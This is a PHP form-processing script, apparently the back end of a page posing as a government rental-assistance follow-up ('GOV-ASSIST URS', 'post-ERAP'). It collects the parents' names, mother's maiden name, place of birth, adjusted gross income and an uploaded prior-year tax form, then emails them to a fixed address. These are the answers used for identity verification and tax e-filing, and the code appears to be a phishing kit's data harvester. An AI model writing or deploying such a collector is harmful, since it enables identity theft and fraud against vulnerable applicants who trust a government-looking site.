<?php
/**
 * URS Supplemental Intake Processor
 * Sends URS follow-up details (post-ERAP submission) via SMTP.
 */
session_start();

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require_once __DIR__ . '/mailer-lite.php';

$smtpHost = 'smtp.your-agency.gov';
$smtpPort = 587;
$smtpUser = 'smtp-user';
$smtpPass = 'smtp-password';
$fromEmail = 'no-reply@gov-assist-portal.com';
$toEmail   = 'urs-intake@your-agency-portal.com';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_POST['csrf_token_urs'], $_SESSION['csrf_token']) || $_POST['csrf_token_urs'] !== $_SESSION['csrf_token']) {
        die("Security error: Invalid submission.");
    }

    $clean = function ($key) {
        return isset($_POST[$key]) ? trim(filter_var($_POST[$key], FILTER_SANITIZE_SPECIAL_CHARS)) : '';
    };

    $allowedExt = ['pdf', 'jpg', 'jpeg', 'png'];
    $maxSize = 5 * 1024 * 1024; // 5MB

    $validateUpload = function ($file, $label = '') use ($allowedExt, $maxSize) {
        if (!isset($file) || $file['error'] === UPLOAD_ERR_NO_FILE) {
            throw new Exception("Missing required upload: {$label}");
        }
        if ($file['error'] !== UPLOAD_ERR_OK) {
            throw new Exception("Upload error for {$label}");
        }
        if ($file['size'] > $maxSize) {
            throw new Exception("{$label} exceeds size limit.");
        }
        $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
        if (!in_array($ext, $allowedExt, true)) {
            throw new Exception("Invalid file type for {$label}");
        }
        $finfo = new finfo(FILEINFO_MIME_TYPE);
        $mime = $finfo->file($file['tmp_name']);
        $allowedMime = ['application/pdf', 'image/jpeg', 'image/png'];
        if (!in_array($mime, $allowedMime, true)) {
            throw new Exception("Invalid MIME type for {$label}");
        }
        return $file;
    };

    $fatherName   = $clean('urs_father_name');
    $motherName   = $clean('urs_mother_name');
    $maidenName   = $clean('urs_maiden_name');
    $otherContact = $clean('urs_other_contact');
    $birthPlace   = $clean('urs_birth_place');
    $agi          = $clean('urs_agi');

    if (empty($fatherName) || empty($motherName) || empty($maidenName) || empty($otherContact) || empty($birthPlace) || $agi === '') {
        die("Security error: Missing required fields.");
    }

    $fields = [
        "FATHER NAME" => $fatherName,
        "MOTHER NAME" => $motherName,
        "MOTHER MAIDEN NAME" => $maidenName,
        "OTHER CONTACT NAME" => $otherContact,
        "PLACE OF BIRTH" => $birthPlace,
        "ADJUSTED GROSS INCOME / BGI" => $agi,
    ];

    $message = "URS Supplemental Details Received (Post-ERAP)\n";
    $message .= "============================================\n\n";
    foreach ($fields as $label => $value) {
        $message .= "{$label}: {$value}\n";
    }
    $message .= "\nSubmission Timestamp: " . date("Y-m-d H:i:s") . "\n";

    try {
        $supporting = $validateUpload($_FILES['urs_prior_year_form'] ?? null, 'Prior Year B2 or CSA Form');

        $mail = new PHPMailer(true);
        $mail->isSMTP();
        $mail->Host = $smtpHost;
        $mail->Port = $smtpPort;
        $mail->Username = $smtpUser;
        $mail->Password = $smtpPass;
        $mail->SMTPAuth = true;
        $mail->SMTPSecure = 'tls';
        $mail->setFrom($fromEmail, 'GOV-ASSIST URS');
        $mail->addAddress($toEmail);
        $mail->Subject = "URS Supplemental Intake";
        $mail->Body = $message;
        $mail->AltBody = strip_tags($message);
        $mail->isHTML(false);

        if ($supporting) {
            $mail->addAttachment($supporting['tmp_name'], $supporting['name']);
        }

        if ($mail->send()) {
            header("Location: ../success.html");
            exit();
        }

        throw new Exception("Mailer Error: " . $mail->ErrorInfo);
    } catch (Exception $e) {
        echo "<h1>Submission Error</h1>";
        echo "<p>We were unable to process your URS details at this time. Please contact support.</p>";
        echo "<pre>" . htmlspecialchars($e->getMessage()) . "</pre>";
        echo "<a href='../erap-urs-details.html'>Go Back</a>";
    }
} else {
    header("Location: ../index.html");
    exit();
}
